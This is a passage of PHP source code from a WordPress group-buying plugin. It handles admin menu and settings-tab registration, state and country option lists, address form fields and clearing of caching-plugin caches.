	 * @return string The ID of the payment settings page
	 */
	public static function get_settings_page() {
		return self::$settings_page;
	}

	/**
	 * Creates the main admin page, and any registered sub-pages
	 *
	 * @static
	 * @return void
	 */
	public static function add_admin_page() {
		self::$settings_page = add_menu_page( self::__( 'Group Buying Options' ), self::__( 'Group Buying' ), 'manage_options', self::TEXT_DOMAIN, array( get_class(), 'display_admin_page' ), GB_URL . '/resources/img/gbs.png', 3 );
		uasort( self::$admin_pages, array( get_class(), 'sort_by_weight' ) );
		foreach ( self::$admin_pages as $page => $data ) {
			$callback = ( is_callable( $data['callback'] ) ) ? $data['callback'] : array( get_class(), 'display_admin_page' ) ;
			$hook = add_submenu_page( self::TEXT_DOMAIN, self::__( $data['title'] ), self::__( $data['menu_title'] ), 'manage_options', $page, $callback );
			self::$admin_pages[$page]['hook'] = $hook;
		}
	}

	public static function register_settings_fields() {
		// register_setting( Group_Buying_UI::get_settings_page(), self::TEMPLATE_PATH_OPTION );
		// add_settings_field( self::TEMPLATE_PATH_OPTION, self::__( 'Template Override Directory' ), array( get_class(), 'display_template_path_settings_field' ), Group_Buying_UI::get_settings_page(), 'gb_general_settings' );
	}

	public static function display_template_path_settings_field() {
		printf( '<input type="text" name="%s" id="%s" value="%s" size="20" disabled="disabled"/> <br/><span class="description">%s</span>', self::TEMPLATE_PATH_OPTION, self::TEMPLATE_PATH_OPTION, esc_attr( self::$template_path ), self::__( 'Advanced: Templates found in this subdirectory of your theme can override the default templates found in the views directory of this plugin. This option is disabled and can be updated manually.' ) );
	}

	/**
	 * Displays an admin/settings page
	 *
	 * @static
	 * @return void
	 */
	public static function display_admin_page() {
		if ( !current_user_can( 'manage_options' ) ) {
			return; // not allowed to view this page
		}
		$plugin_page = $_GET['page'];
		if ( isset( self::$admin_pages[$plugin_page]['title'] ) ) {
			$title = self::$admin_pages[$plugin_page]['title'];
		} else {
			$title = self::__( 'Group Buying' );
		}
		$reset = isset(self::$admin_pages[$plugin_page]['reset'])?self::$admin_pages[$plugin_page]['reset']:'';
		$section = isset(self::$admin_pages[$plugin_page]['section'])?self::$admin_pages[$plugin_page]['section']:'';
		self::load_view( 'admin/settings', array(
				'title' => self::__($title),
				'page' => $plugin_page,
				'reset' => $reset,
				'section' => $section
			), FALSE );
	}

	public static function display_admin_tabs( $plugin_page = NULL ) {
		if ( $plugin_page === NULL ) {
			$plugin_page = $_GET['page'];
			$plugin_page = ( $_GET['page'] == self::TEXT_DOMAIN ) ? self::TEXT_DOMAIN.'/gb_settings' : $_GET['page'] ;
		}
		$tabs = apply_filters( 'gb_option_tabs', self::$option_tabs );
		uasort( $tabs, array( get_class(), 'sort_by_weight' ) );
		$section = self::$admin_pages[$plugin_page]['section'];
		$tabbed = array();
		foreach ( $tabs as $tab => $data ):
			if ( $data['section'] == $section && !in_array( $data['slug'], $tabbed ) ) {
				$current_page = ( isset( $_GET['page'] ) ) ? str_replace( 'group-buying/', '', $_GET['page'] ) : 'gb_settings';
				$new_title = self::__( str_replace( 'Settings', '', $data['title'] ) );
				$current = ( $current_page == $data['slug'] ) ? ' nav-tab-active' : '';
				echo '<a href="admin.php?page=group-buying/'.$data['slug'].'" class="nav-tab'.$current.'" id="gb_options_tab_'.$data['slug'].'">'.$new_title.'</a>';
				$tabbed[] = $data['slug'];
			}
		endforeach;
	}

	/**
	 * Register a settings sub-page in the plugin's menu
	 *
	 * @static
	 * @param string  $slug
	 * @param string  $title
	 * @param string  $menu_title
	 * @param string  $weight
	 * @return string The menu slug that will be used for the page
	 */
	protected static function register_settings_page( $slug, $title, $menu_title, $weight, $reset = FALSE, $section = 'theme', $callback = NULL ) {
		$page = self::TEXT_DOMAIN.'/'.$slug;
		self::$option_tabs[] = array(
			'slug' => $slug,
			'title' => $menu_title,
			'weight' => $weight,
			'section' => $section
		);
		self::$admin_pages[$page] = array(
			'title' => $title,
			'menu_title' => $menu_title,
			'weight' => $weight,
			'reset' => $reset,
			'section' => $section,
			'callback' => $callback
		);
		return $page;
	}

	/**
	 * For most settings sections, there's nothing special to display.
	 * This function will display just that. Use it as a callback for
	 * add_settings_section().
	 *
	 * @return void
	 */
	public function display_settings_section() {}

	public static function get_state_options( $args = array() ) {
		$states = self::$grouped_states;
		if ( isset( $args['include_option_none'] ) && $args['include_option_none'] ) {
			$states = array( '' => $args['include_option_none'] ) + $states;
		}
		$states = apply_filters( 'gb_state_options', $states, $args );
		return $states;
	}

	public static function get_country_options( $args = array() ) {
		$countries = self::$countries;
		if ( isset( $args['include_option_none'] ) && $args['include_option_none'] ) {
			$countries = array( '' => $args['include_option_none'] ) + $countries;
		}
		$countries = apply_filters( 'gb_country_options', $countries, $args );
		return $countries;
	}


	public function get_standard_address_fields( $account = NULL, $shipping = FALSE ) {

		if ( !$account ) {
			$account = Group_Buying_Account::get_instance();
		}

		if ( is_user_logged_in() ) { // Prevent anonymous user info from populating.
			$address = $account->get_address();
			if ( $shipping ) {
				$ship_address = $account->get_ship_address();
				if ( !empty( $ship_address ) ) $address = $ship_address;
			}
		}

		$fields = array();
		$fields['first_name'] = array(
			'weight' => 0,
			'label' => self::__( 'First Name' ),
			'type' => 'text',
			'required' => TRUE,
			'default' => is_user_logged_in()?$account->get_name( 'first' ):'',
		);
		$fields['last_name'] = array(
			'weight' => 1,
			'label' => self::__( 'Last Name' ),
			'type' => 'text',
			'required' => TRUE,
			'default' => is_user_logged_in()?$account->get_name( 'last' ):'',
		);
		$fields['street'] = array(
			'weight' => 11,
			'label' => self::__( 'Street Address' ),
			'type' => 'textarea',
			'rows' => 2,
			'required' => TRUE,
			'default' => isset( $address['street'] )?$address['street']:'',
		);
		$fields['city'] = array(
			'weight' => 12,
			'label' => self::__( 'City' ),
			'type' => 'text',
			'required' => TRUE,
			'default' => isset( $address['city'] )?$address['city']:'',
		);
		$fields['zone'] = array(
			'weight' => 13,
			'label' => self::__( 'State' ),
			'type' => 'select-state',
			'options' => self::get_state_options( array( 'include_option_none' => ' -- '.self::__( 'Select a State' ).' -- ' ) ),
			'default' => isset( $address['zone'] )?$address['zone']:'',
		); // TODO: 3.x Add some JavaScript to switch between select box/text-field depending on country

		$fields['postal_code'] = array(
			'weight' => 14,
			'label' => self::__( 'ZIP Code' ),
			'type' => 'text',
			'required' => TRUE,
			'default' => isset( $address['postal_code'] )?$address['postal_code']:'',
		);
		$fields['country'] = array(
			'weight' => 15,
			'label' => self::__( 'Country' ),
			'type' => 'select',
			'required' => TRUE,
			'options' => self::get_country_options( array( 'include_option_none' => ' -- '.self::__( 'Select a Country' ).' -- ' ) ),
			'default' => isset( $address['country'] )?$address['country']:'',
		);
		return $fields;
	}

	public static function using_permalinks() {
		return get_option( 'permalink_structure' ) != '';
	}

	/**
	 * Tell caching plugins not to cache the current page load
	 */
	public static function do_not_cache() {
		if ( !defined('DONOTCACHEPAGE') ) {
			define('DONOTCACHEPAGE', TRUE);
		}
	}

	/**
	 * Tell caching plugins to clear their caches related to a post
	 *
	 * @static
	 * @param int $post_id
	 */
	public static function clear_post_cache( $post_id ) {
		if ( function_exists( 'wp_cache_post_change' ) ) {
			// WP Super Cache

			$GLOBALS["super_cache_enabled"] = 1;
			wp_cache_post_change( $post_id );

		} elseif ( function_exists( 'w3tc_pgcache_flush_post' ) ) {
			// W3 Total Cache

			w3tc_pgcache_flush_post( $post_id );

		}
	}
}
